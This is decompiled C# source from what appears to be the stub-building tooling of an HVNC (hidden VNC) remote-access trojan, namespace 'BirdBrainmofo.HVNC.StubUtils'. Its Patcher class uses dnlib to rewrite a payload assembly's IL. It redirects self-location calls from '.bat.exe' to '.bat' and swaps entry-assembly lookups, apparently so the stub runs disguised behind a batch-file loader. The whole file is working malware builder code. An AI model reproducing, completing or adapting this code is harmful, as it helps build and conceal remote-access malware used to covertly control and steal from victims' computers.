using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace BirdBrainmofo.HVNC.StubUtils
{
	// Token: 0x020000AD RID: 173
	public class Patcher
	{
		// Token: 0x06000854 RID: 2132 RVA: 0x0005AC4C File Offset: 0x00058E4C
		public static byte[] Fix(byte[] input)
		{
			ModuleDef moduleDef = ModuleDefMD.Load(input);
			foreach (TypeDef typeDef in moduleDef.GetTypes())
			{
				if (!typeDef.IsGlobalModuleType)
				{
					foreach (MethodDef methodDef in typeDef.Methods)
					{
						if (methodDef.HasBody)
						{
							IList<Instruction> instructions = methodDef.Body.Instructions;
							for (int i = 0; i < instructions.Count; i++)
							{
								if (instructions[i].ToString().Contains("System.Diagnostics.ProcessModule::get_FileName()"))
								{
									instructions.Insert(i + 1, OpCodes.Ldstr.ToInstruction(".bat.exe"));
									instructions.Insert(i + 2, OpCodes.Ldstr.ToInstruction(".bat"));
									instructions.Insert(i + 3, OpCodes.Callvirt.ToInstruction(methodDef.Module.Import(GetSystemMethod(typeof(string), "Replace", 1))));
								}
								else if (instructions[i].ToString().Contains("System.Reflection.Assembly::get_Location()"))
								{
									instructions.Insert(i + 1, OpCodes.Ldstr.ToInstruction(".bat.exe"));
									instructions.Insert(i + 2, OpCodes.Ldstr.ToInstruction(".bat"));
									instructions.Insert(i + 3, OpCodes.Callvirt.ToInstruction(methodDef.Module.Import(GetSystemMethod(typeof(string), "Replace", 1))));
								}
								else if (instructions[i].ToString().Contains("System.Reflection.Assembly::GetEntryAssembly()"))
								{
									instructions[i] = OpCodes.Call.ToInstruction(methodDef.Module.Import(GetSystemMethod(typeof(Assembly), "GetExecutingAssembly")));
								}
							}
							methodDef.Body.SimplifyBranches();
						}
					}
				}
			}
			MemoryStream memoryStream = new MemoryStream();
			moduleDef.Write(memoryStream);
			byte[] array = memoryStream.ToArray();
			memoryStream.Dispose();
			return array;
		}

		// Token: 0x06000855 RID: 2133 RVA: 0x0005AECC File Offset: 0x000590CC
		private static MethodDef GetSystemMethod(Type type, string name, int idx = 0)
		{
			string fullyQualifiedName = type.Module.FullyQualifiedName;
			ModuleDefMD moduleDefMD = ModuleDefMD.Load(fullyQualifiedName);
			TypeDef[] array = moduleDefMD.GetTypes().ToArray();
			List<MethodDef> list = new List<MethodDef>();
			foreach (TypeDef typeDef in array)
			{
				if (!(typeDef.Name != type.Name))
				{
					foreach (MethodDef methodDef in typeDef.Methods)
					{
						if (!(methodDef.Name != name))
						{
							list.Add(methodDef);
						}
					}
				}
			}
			MethodDef methodDef2;
			if (list.Count > 0)
			{
				methodDef2 = list[idx];
			}
			else
			{
				methodDef2 = null;
			}
			return methodDef2;
		}

		// Token: 0x06000856 RID: 2134 RVA: 0x00006F52 File Offset: 0x00005152
    }
}
